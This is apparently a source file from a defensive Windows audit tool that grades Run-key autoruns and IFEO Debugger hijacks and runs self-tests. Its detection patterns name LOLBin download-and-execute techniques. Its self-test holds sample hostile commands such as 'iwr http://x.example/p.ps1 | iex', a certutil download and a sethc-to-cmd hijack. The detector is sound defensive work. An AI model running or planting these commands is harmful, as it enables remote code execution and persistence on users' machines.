# persistence_eval.ps1 -- evaluate Run/RunOnce autoruns and IFEO Debugger
# hijacks for known-malicious indicators. Invoked from Section 5 of
# doze_sec.bat / doze_sec_noAdmin.bat.
#
# WHY: Section 5 raw-dumps the Run keys and printed a bare "[IFEO HIT]" for
# Debugger values, but never evaluated either -- an encoded-PowerShell Run
# key or an IFEO Debugger on a non-accessibility binary scrolled past with no
# verdict (code-review gaps, issue #138). This adds high-signal, low-false-
# positive evaluation:
#
#   Run/RunOnce  -- flags autorun commands whose CONTENT is a strong backdoor
#                   indicator: encoded PowerShell (-enc / -EncodedCommand /
#                   FromBase64String / -e <base64>), or LOLBin download-and-exec
#                   (DownloadString/DownloadFile, iwr|curl|wget to http, piped
#                   or invoked iex, mshta http/javascript, certutil
#                   -urlcache/-decode, bitsadmin /transfer, regsvr32 /i:http or
#                   scrobj, rundll32 javascript); or execution from an unusual
#                   autorun location (\Temp\, \Downloads\, \Public\).
#                   A hidden-window launcher (-w hidden) is common in
#                   legitimate updaters, so it is flagged ONLY when it
#                   co-occurs with a download/encode indicator -- never on its
#                   own. Common legit autorun paths (\AppData\, \ProgramData\)
#                   are deliberately NOT flagged on path alone --
#                   Slack/Discord/Teams/Spotify live there -- so this does not
#                   reintroduce false alarms.
#
#   IFEO         -- ANY Debugger value under Image File Execution Options is a
#                   hijack technique (the debugger runs instead of the target
#                   binary). Section 13 escalates the accessibility binaries
#                   to CRITICAL separately; here every IFEO Debugger, on any
#                   binary, is surfaced as a WARNING so non-accessibility
#                   targets (e.g. notepad.exe) are no longer silent -- with ONE
#                   documented exception: Process Explorer's "Replace Task
#                   Manager" option (Sysinternals, Options menu) is implemented
#                   as exactly this value on taskmgr.exe. When the debugger is a
#                   validly Microsoft-signed procexp binary that is context,
#                   not a finding; an unsigned file called procexp64.exe on the
#                   same key is still the hijack. Get-IfeoVerdict holds the
#                   rule and -SelfTest pins both sides.
#
# A finding writes -MarkerFile so the caller raises the exit code / findings
# count. CRITICAL is intentionally not emitted here (these are high-but-not-
# certain indicators); the caller treats a hit as a WARNING.
#
# Windows PowerShell 5.1 compatible. Read-only (registry reads + one marker
# file write). Executed by the helpers-ps51 CI job.

[CmdletBinding()]
param(
    [string]$MarkerFile,
    [switch]$SelfTest,
    # Whether this process runs elevated. Read once from the token below;
    # injectable so the self-test can grade both tokens. -1 = detect.
    [int]$Elevated = -1
)

$ErrorActionPreference = 'Continue'

function Write-MarkerFile {
    # The marker IS the route to the findings ledger: a failed write turns a
    # real finding into a CLEAN section. Create the directory rather than
    # assume it, and let a genuine failure print instead of vanishing -- the
    # bare `Set-Content -EA SilentlyContinue` this replaces is the exact
    # pattern that cost a field test its finding across twelve tools, and it
    # survived here because tests/marker_selftest.ps1 only discovered tools
    # that define a Write-Marker FUNCTION.
    param([string]$Path, [string]$Value = 'hit')
    if (-not $Path) { return }
    $dir = Split-Path -Parent $Path
    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force -EA SilentlyContinue | Out-Null
    }
    Set-Content -LiteralPath $Path -Value $Value -Encoding ASCII
}

# Registry key last-write time. PowerShell's registry provider does NOT expose
# it -- Get-Item on a key returns a RegistryKey with no LastWriteTime -- so it
# has to come from RegQueryInfoKey. The type is defined once per process and
# every failure path degrades to $null, which simply omits the registry half of
# the "when:" line rather than inventing a date.
function Get-RegKeyLastWrite {
    param([string]$KeyPath)
    if (-not $KeyPath) { return $null }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'DozeSec.RegTime').Type) {
            Add-Type -ErrorAction Stop -Namespace DozeSec -Name RegTime -MemberDefinition @'
[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern int RegQueryInfoKey(IntPtr hKey, System.Text.StringBuilder lpClass,
    IntPtr lpcchClass, IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen,
    IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen,
    IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, out long lpftLastWriteTime);
'@
        }
    } catch { return $null }
    $key = $null
    try {
        # Accept both provider paths (HKLM:\...) and PSPath forms.
        $p = $KeyPath -replace '^Microsoft\.PowerShell\.Core\\Registry::', ''
        $p = $p -replace '^HKEY_LOCAL_MACHINE\\', 'HKLM:\' -replace '^HKEY_CURRENT_USER\\', 'HKCU:\'
        $key = Get-Item -LiteralPath $p -EA Stop
        $ft = [long]0
        $rc = [DozeSec.RegTime]::RegQueryInfoKey($key.Handle.DangerousGetHandle(),
            $null, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [ref]$ft)
        if ($rc -ne 0 -or $ft -le 0) { return $null }
        return [datetime]::FromFileTime($ft)
    } catch { return $null }
}

# Timestamps on a persistence finding: WHEN did this appear? For someone working
# out whether an implant predates a relationship, a job, or a break-in, that is
# the question the finding itself never answered. Both halves are optional --
# whichever is unavailable is simply omitted.
#
# TWO LIMITS, STATED IN THE REPORT TOO, because a timestamp presented without
# them is worse than none:
#   * Registry last-write is per KEY, not per value. Changing ANY value in a Run
#     key updates the whole key, so this is an upper bound on when THIS entry
#     appeared, not a precise date for it.
#   * File times are trivially forged (timestomping, T1070.006). An attacker who
#     cares sets them to whatever they like.
function Get-WhenLine {
    param([string]$KeyPath = '', [string]$FilePath = '')
    $parts = @()
    if ($KeyPath) {
        $lw = Get-RegKeyLastWrite $KeyPath
        if ($null -ne $lw) { $parts += ("registry key last modified {0}" -f $lw.ToString('yyyy-MM-dd HH:mm:ss')) }
    }
    if ($FilePath) {
        try {
            $f = Get-Item -LiteralPath $FilePath -EA Stop
            $parts += ("file written {0}" -f $f.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss'))
            # Creation AFTER last-write is the classic timestomp tell, so show
            # creation whenever the two disagree in either direction.
            if ($f.CreationTime -and $f.CreationTime -ne $f.LastWriteTime) {
                $parts += ("created {0}" -f $f.CreationTime.ToString('yyyy-MM-dd HH:mm:ss'))
            }
        } catch {}
    }
    if ($parts.Count -eq 0) { return $null }
    return ("  when: {0}" -f ($parts -join '  |  '))
}

# Pull the executable out of an autorun command line so its file times can be
# read: strip a quoted path, or take everything up to the first argument, then
# expand environment variables. Returns '' when nothing file-like is found (a
# pure `powershell -enc <blob>` autorun has no interesting file of its own --
# the registry timestamp is the signal there).
function Get-AutorunBinary {
    param([string]$Command)
    $path = Get-CommandPath $Command
    if (-not $path) { return '' }
    try { $path = [Environment]::ExpandEnvironmentVariables($path) } catch {}
    if (Test-Path -LiteralPath $path -PathType Leaf) { return $path }
    return ''
}

# Emitted once, immediately before the first timestamped finding in this tool's
# output, so the numbers are never read as more precise than they are.
$script:whenCaveatShown = $false
function Write-WhenCaveat {
    if ($script:whenCaveatShown) { return }
    $script:whenCaveatShown = $true
    '  note: registry times are per KEY (any value change updates them) and file times can be forged (timestomping, T1070.006) -- treat them as leads, not proof.'
}

# PowerShell adds these note-properties to every Get-ItemProperty result; they
# are not registry values. Matched by EXACT name -- a '^PS' prefix match would
# also swallow real values whose names start with "PS".
$psNoteProps = @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider')

# STRONG command-content indicators -- fire on their own (unambiguous):
# encoded PowerShell, base64 decode, and LOLBin download-and-exec.
$script:StrongContent = @(
    '-enc(odedcommand)?\b',
    '-e\s+[A-Za-z0-9+/=]{24,}',
    'frombase64string',
    'downloadstring', 'downloadfile',
    '(invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b)[^\r\n]*https?:',
    '(iex|invoke-expression)\s*[\(\$]', '\|\s*(iex|invoke-expression)\b',
    'mshta\s+https?:', 'mshta\s+javascript', 'mshtml,runhtmlapplication',
    'certutil[^\r\n]*-urlcache', 'certutil[^\r\n]*-decode', 'bitsadmin[^\r\n]*/transfer',
    'regsvr32[^\r\n]*/i:http', 'regsvr32[^\r\n]*scrobj', 'rundll32[^\r\n]*javascript'
)
# A hidden-window launcher (-w hidden) ALONE is common in legitimate updaters,
# so flag it only when it co-occurs with a download/encode indicator.
$script:HiddenLauncher = '-w(indowstyle)?\s+hidden'
$script:HiddenCombine  = @('-enc', 'frombase64', 'downloadstring', 'downloadfile',
                           'https?:', '(iex|invoke-expression)\b', '-e\s+[A-Za-z0-9+/=]{24,}')
# Unusual autorun LOCATIONS (path-only signal; kept narrow to avoid FPs).
# Anchored to \Users\Public\ on purpose: a bare \Public\ matched any directory
# named public, e.g. a Node native addon under node_modules\...\public\ in
# Program Files (field false positive 2026-09-20, CRITICAL, exit code 8).
$script:SuspPath = @('\\Temp\\', '\\Downloads\\', '\\Users\\Public\\')

# ---------------------------------------------------------------------------
# PURE VERDICTS. Plain strings in, a reason (or nothing) out: no registry, no
# disk, no signature check. The judgement lives here so it can be pinned
# against the real autoruns of a real machine.
# ---------------------------------------------------------------------------

# The executable named by a command line, WITHOUT touching the disk: a quoted
# path, or the first token. Used by the IFEO rule (which needs the file name)
# and by Get-AutorunBinary (which then checks the disk).
function Get-CommandPath {
    param([string]$Command)
    if (-not $Command) { return '' }
    $c = $Command.Trim()
    if ($c.StartsWith('"')) {
        $end = $c.IndexOf('"', 1)
        if ($end -gt 1) { return $c.Substring(1, $end - 1) }
        return ''
    }
    $m = [regex]::Match($c, '^([^\s]+\.(?:exe|dll|scr|bat|cmd|ps1|vbs|js|com))\b', 'IgnoreCase')
    if ($m.Success) { return $m.Groups[1].Value }
    return ($c -split '\s+')[0]
}

# A Run/RunOnce value: the reason it is suspicious, or $null when it is not.
# Three tiers, strongest first: command CONTENT (fires alone), a hidden-window
# launcher combined with a download/encode indicator, then an unusual PATH.
function Get-AutorunVerdict {
    param([string]$Key, [string]$Name, [string]$Value)
    if (-not $Value) { return $null }
    foreach ($s in $script:StrongContent) { if ($Value -match $s) { return "command content ($s)" } }
    if ($Value -match $script:HiddenLauncher) {
        foreach ($s in $script:HiddenCombine) { if ($Value -match $s) { return "hidden-window launcher + $s" } }
    }
    foreach ($s in $script:SuspPath) { if ($Value -match $s) { return "unusual autorun path ($s)" } }
    return $null
}

# An IFEO Debugger value. Every one is a hijack EXCEPT the one Sysinternals
# documents: Process Explorer > Options > Replace Task Manager writes
#   IFEO\taskmgr.exe\Debugger = "<path>\procexp64.exe"
# (https://learn.microsoft.com/sysinternals/downloads/process-explorer). That
# is context when -- and only when -- the debugger binary is validly signed by
# Microsoft (Sysinternals ships Microsoft-signed). The NAME is not the
# evidence: an unsigned file called procexp64.exe on that key is the hijack.
function Get-IfeoVerdict {
    param([string]$Target, [string]$Debugger, [bool]$DebuggerSigned, [string]$DebuggerSigner = '')
    $exe = Split-Path -Leaf (Get-CommandPath $Debugger)
    if ($Target -ieq 'taskmgr.exe' -and $exe -imatch '^procexp(64)?(a)?\.exe$' -and $DebuggerSigned -and $DebuggerSigner -match '\bMicrosoft\b') {
        return @{ Sev = 'OK'; Line = "[INFO] IFEO Debugger on taskmgr.exe is Process Explorer's 'Replace Task Manager' option (validly Microsoft-signed): $Debugger. Context, not a finding -- Sysinternals writes exactly this value." }
    }
    return @{ Sev = 'WARNING'; Line = "[WARNING] IFEO Debugger hijack: $Target => $Debugger" }
}

# PURE: IFEO subkeys the token could not open. The enumeration used to run
# with -EA Stop, so ONE restricted subkey terminated it and the whole
# Debugger-hijack check printed [SKIPPED] -- both standard-user field runs of
# 2026-09-24 lost it that way. Now the readable subkeys are graded and the
# unreadable ones are NAMED: as a standard user that is the token (INFO, not
# graded, not cleared); elevated, an IFEO entry an administrator cannot read
# is itself worth a finding (WARNING) -- a Debugger value there cannot be
# audited, and a restricted ACL is how one would be hidden.
function Get-IfeoReadReport {
    param([string[]]$Unreadable, [bool]$IsElevated)
    $u = @($Unreadable | Where-Object { $_ })
    if ($u.Count -eq 0) { return @{ Lines = @(); Sev = 'OK' } }
    $noun = if ($u.Count -eq 1) { 'entry' } else { 'entries' }
    if ($IsElevated) {
        return @{ Sev = 'WARNING'; Lines = @(("[WARNING] {0} IFEO {1} not readable by an administrator: {2} -- a Debugger value there cannot be audited, and a restricted ACL is how a hijack would be hidden (verify: reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<name>"" from an elevated prompt)." -f $u.Count, $noun, ($u -join ', '))) }
    }
    return @{ Sev = 'OK'; Lines = @(("[INFO] {0} IFEO {1} not readable from this token: {2} -- not graded, not cleared; re-run as administrator to grade them." -f $u.Count, $noun, ($u -join ', '))) }
}

if ($SelfTest) {
    $fails = 0
    function T { param([string]$Name, [bool]$Ok, [string]$Got)
        if ($Ok) { Write-Output "[OK]   $Name" } else { Write-Output "[FAIL] $Name$(if($Got){": $Got"})"; $script:fails++ }
    }
    $hkcu = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $hklm = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
    # The owner's real autoruns, pinned VERBATIM from
    # SecurityReport_20260920_185017 (Section 5 reg query dump). Every one is
    # ordinary software and every one must grade $null.
    $benign = @(
        @($hkcu, 'OneDrive', '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'),
        @($hkcu, 'BraveSoftware Update', '"C:\Users\khali\AppData\Local\BraveSoftware\Update\1.3.361.151\BraveUpdateCore.exe"'),
        @($hkcu, 'org.whispersystems.signal-desktop', 'C:\Users\khali\AppData\Local\Programs\signal-desktop\Signal.exe --start-in-tray'),
        @($hkcu, 'Adobe Acrobat Synchronizer', '"C:\Program Files\Adobe\Acrobat DC\Acrobat\AdobeCollabSync.exe"'),
        @($hkcu, 'Proton Drive', '"C:\Users\khali\AppData\Local\Programs\Proton\Drive\ProtonDrive.exe" -quiet'),
        @($hkcu, 'MicrosoftEdgeAutoLaunch_5B486EA56FC3A190C4F0BB45771E329D', '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start'),
        @($hkcu, 'Docker Desktop', 'C:\Users\khali\AppData\Local\Programs\DockerDesktop\Docker Desktop.exe'),
        @($hkcu, 'MicrosoftCopilotAutoLaunch_F6FB03BD129D17F0D98665BA91661954', '"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --no-startup-window --win-session-start'),
        @($hklm, 'SecurityHealth', '%windir%\system32\SecurityHealthSystray.exe'),
        @($hklm, 'RtkAudUService', '"C:\WINDOWS\System32\DriverStore\FileRepository\realtekservice.inf_amd64_d4e2f40b8460b254\RtkAudUService64.exe" -background'),
        @($hklm, 'WavesSvc', '"C:\WINDOWS\System32\DriverStore\FileRepository\wavesapo12de.inf_amd64_7705ab85ca3fc744\WavesSvc64.exe" -Jack'),
        @($hklm, 'deviceTRUST Client User', '""'),
        @($hklm, 'RTKUGUI', '"C:\WINDOWS\system32\RtkUGui64.exe" -s'),
        @($hklm, 'Logi Download Assistant', '"C:\Program Files\LogiDownloadAssistant\bin\logi_download_assistant.exe" -system-restarted'),
        @('HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'msedge_cleanup_{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}', '"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\153.0.4234.48\Installer\setup.exe" --msedgewebview --delete-old-versions --system-level --verbose-logging')
    )
    foreach ($b in $benign) {
        $why = Get-AutorunVerdict -Key $b[0] -Name $b[1] -Value $b[2]
        T ("owner's real autorun is not a finding: " + $b[1]) ($null -eq $why) ("why=" + $why)
    }
    T 'a hidden-window launcher ALONE is common in updaters and is not a finding' ($null -eq (Get-AutorunVerdict -Key $hkcu -Name 'Upd' -Value 'powershell.exe -WindowStyle Hidden -File "C:\Program Files\Vendor\update.ps1"')) ''
    T 'an AppData path alone is not a finding (Slack, Discord, Teams live there)' ($null -eq (Get-AutorunVerdict -Key $hkcu -Name 'X' -Value 'C:\Users\u\AppData\Local\Vendor\app.exe --minimized')) ''
    T 'a ProgramData path alone is not a finding' ($null -eq (Get-AutorunVerdict -Key $hklm -Name 'X' -Value '"C:\ProgramData\Vendor\agent.exe" /tray')) ''
    T 'an empty value is not a finding' ($null -eq (Get-AutorunVerdict -Key $hklm -Name 'X' -Value '')) ''

    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
    T 'hidden window + -enc is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell.exe -w hidden -c "iwr http://x.example/p.ps1 | iex"'
    T 'hidden window + a download is a finding' ($null -ne $why) ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAA=='
    T '-e followed by a base64 blob is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'mshta http://x.example/a.hta'
    T 'mshta from a URL is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'certutil -urlcache -split -f http://x.example/a.exe a.exe'
    T 'certutil -urlcache is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'C:\Users\u\Downloads\setup_helper.exe'
    T 'an autorun from Downloads is a finding on path alone' ($why -match 'unusual autorun path') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value '"C:\Users\Public\svc.exe" -q'
    T 'an autorun from Users\Public is a finding' ($why -match 'unusual autorun path') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'C:\Users\u\AppData\Local\Temp\upd.exe'
    T 'an autorun from Temp is a finding' ($why -match 'unusual autorun path') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hklm -Name 'X' -Value 'C:\Program Files\Vendor\public\helper.exe'
    T 'a vendor directory named public is NOT a staging path (the #214 regex)' ($null -eq $why) ("why=" + $why)

    # IFEO: the documented benign twin and its impostor.
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger '"C:\Tools\SysinternalsSuite\procexp64.exe"' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US'
    T 'IFEO taskmgr.exe -> Microsoft-signed procexp64.exe is Replace Task Manager: INFO, no finding' ($v.Sev -eq 'OK' -and $v.Line -match "^\[INFO\] .*Replace Task Manager") $v.Line
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Tools\procexp.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation'
    T 'the 32-bit procexp.exe name is covered too' ($v.Sev -eq 'OK') $v.Line
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Users\Public\procexp64.exe' -DebuggerSigned $false -DebuggerSigner ''
    T 'an UNSIGNED procexp64.exe on taskmgr.exe is the hijack (the name is not the evidence)' ($v.Sev -eq 'WARNING' -and $v.Line -match '^\[WARNING\] IFEO Debugger hijack: taskmgr\.exe') $v.Line
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Tools\procexp64.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Some Other Publisher'
    T 'a procexp64.exe signed by someone other than Microsoft is the hijack' ($v.Sev -eq 'WARNING') $v.Line
    $v = Get-IfeoVerdict -Target 'notepad.exe' -Debugger 'C:\Tools\procexp64.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation'
    T 'signed procexp on any target OTHER than taskmgr.exe is still a hijack' ($v.Sev -eq 'WARNING') $v.Line
    $v = Get-IfeoVerdict -Target 'sethc.exe' -Debugger 'C:\Windows\System32\cmd.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Windows'
    T 'sethc.exe -> cmd.exe is the classic hijack even though cmd.exe is Microsoft-signed' ($v.Sev -eq 'WARNING') $v.Line
    $v = Get-IfeoVerdict -Target 'notepad.exe' -Debugger 'C:\Users\Public\d.exe' -DebuggerSigned $false
    T 'a non-accessibility target with an unsigned debugger is a WARNING' ($v.Sev -eq 'WARNING') $v.Line
    T 'Get-CommandPath strips quotes and arguments' ((Get-CommandPath '"C:\Program Files\X\y.exe" --flag') -eq 'C:\Program Files\X\y.exe' -and (Get-CommandPath 'C:\T\z.exe -a') -eq 'C:\T\z.exe') ''

    # IFEO subkeys the token cannot open (both standard-user field runs of
    # 2026-09-24 lost the whole check to one such subkey).
    $r = Get-IfeoReadReport -Unreadable @('dzsmoke_ifeo.exe') -IsElevated $false
    T 'an unreadable IFEO subkey as a standard user is INFO, named, not graded, not cleared -- and the check still runs' ($r.Sev -eq 'OK' -and $r.Lines.Count -eq 1 -and $r.Lines[0] -match '^\[INFO\] 1 IFEO entry not readable from this token: dzsmoke_ifeo\.exe -- not graded, not cleared') ($r.Lines -join ' | ')
    $r = Get-IfeoReadReport -Unreadable @('a.exe', 'b.exe') -IsElevated $true
    T 'IFEO subkeys an ADMINISTRATOR cannot read are a WARNING that names them' ($r.Sev -eq 'WARNING' -and $r.Lines[0] -match '^\[WARNING\] 2 IFEO entries not readable by an administrator: a\.exe, b\.exe') ($r.Lines -join ' | ')
    $r = Get-IfeoReadReport -Unreadable @() -IsElevated $false
    T 'no unreadable IFEO subkeys prints nothing and raises nothing' ($r.Sev -eq 'OK' -and $r.Lines.Count -eq 0) ($r.Lines -join ' | ')

    if ($fails) { Write-Output "[FAIL] $fails persistence_eval self-test expectation(s) unmet"; exit 1 }
    Write-Output "[OK] persistence_eval self-test: the owner's $($benign.Count) real autoruns are not findings, encoded/downloading/staged ones are, and Process Explorer's Replace Task Manager is context while an unsigned impostor is the hijack."
    exit 0
}

if ($Elevated -lt 0) {
    $Elevated = 0
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        if ((New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { $Elevated = 1 }
    } catch {}
}

$runKeys = @(
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKCU:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
)

$found = $false

foreach ($k in $runKeys) {
    if (-not (Test-Path $k)) { continue }
    $props = Get-ItemProperty -Path $k -EA SilentlyContinue
    if (-not $props) { continue }
    foreach ($p in $props.PSObject.Properties) {
        # Skip PowerShell's synthetic note-properties by EXACT name.
        #
        # This test used to be `-match '^PS'` -- a case-insensitive PREFIX
        # match. It skipped PSPath/PSChildName/... as intended, but it also
        # skipped every REAL registry value whose name merely began with "PS".
        # Naming a Run-key autorun "PSUpdater" or "psnotify" therefore hid it
        # from this evaluator completely: no verdict, no finding, no ledger
        # entry. That is a one-word evasion of the tool's most important
        # persistence check, and "PS" is a natural prefix for anything
        # PowerShell-flavoured, so it could also happen by accident.
        if ($psNoteProps -contains $p.Name) { continue }
        $val = [string]$p.Value
        if (-not $val) { continue }

        $why = Get-AutorunVerdict -Key $k -Name $p.Name -Value $val
        if ($why) {
            $found = $true
            # Value NAME on the [WARNING] line so it is greppable per-entry.
            "[WARNING] Suspicious Run-key autorun [$($k)\$($p.Name)]: $val"
            "  indicator: $why"
            Write-WhenCaveat
            $w = Get-WhenLine -KeyPath $k -FilePath (Get-AutorunBinary $val)
            if ($w) { $w }
        }
    }
}

$ifeoBase = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
$ifeoOk = $true
$subs = @()
$ifeoErr = @()
# Per-subkey errors ("Requested registry access is not allowed") are collected,
# not fatal: one restricted subkey used to terminate the enumeration (-EA Stop)
# and lose the entire check. [SKIPPED] is now reserved for the BASE key being
# unreadable.
try {
    if (Test-Path -LiteralPath $ifeoBase) {
        $subs = @(Get-ChildItem -Path $ifeoBase -EA SilentlyContinue -ErrorVariable ifeoErr)
    } else { $ifeoOk = $false }
} catch { $ifeoOk = $false }
if (-not $ifeoOk) {
    '[SKIPPED] IFEO enumeration failed -- Debugger-hijack evaluation NOT performed.'
} else {
    $ifeoUnreadable = @()
    foreach ($e in @($ifeoErr)) {
        $t = [string]$e.TargetObject
        if (-not $t) { $t = [string]$e.CategoryInfo.TargetName }
        if ($t) { $ifeoUnreadable += ($t -replace '^.*[\\/]', '') }
    }
    $rr = Get-IfeoReadReport -Unreadable $ifeoUnreadable -IsElevated ($Elevated -eq 1)
    foreach ($l in $rr.Lines) { $l }
    if ($rr.Sev -eq 'WARNING') { $found = $true }
    foreach ($sub in $subs) {
        $d = Get-ItemProperty -Path $sub.PSPath -Name Debugger -EA SilentlyContinue
        if ($d -and $d.Debugger) {
            $dbg = [string]$d.Debugger
            $bin = Get-AutorunBinary $dbg
            $signed = $false; $signer = ''
            if ($bin) {
                try {
                    $sig = Get-AuthenticodeSignature -FilePath $bin -EA Stop
                    if ($sig -and $sig.Status -eq 'Valid') { $signed = $true; $signer = [string]$sig.SignerCertificate.Subject }
                } catch {}
            }
            $v = Get-IfeoVerdict -Target $sub.PSChildName -Debugger $dbg -DebuggerSigned $signed -DebuggerSigner $signer
            $v.Line
            if ($v.Sev -eq 'WARNING') {
                $found = $true
                Write-WhenCaveat
                $w = Get-WhenLine -KeyPath $sub.PSPath -FilePath $bin
                if ($w) { $w }
            }
        }
    }
}

if (-not $found) {
    '[OK] No suspicious Run-key autoruns or IFEO Debugger hijacks.'
} elseif ($MarkerFile) {
    Write-MarkerFile -Path $MarkerFile -Value 'hit'
}
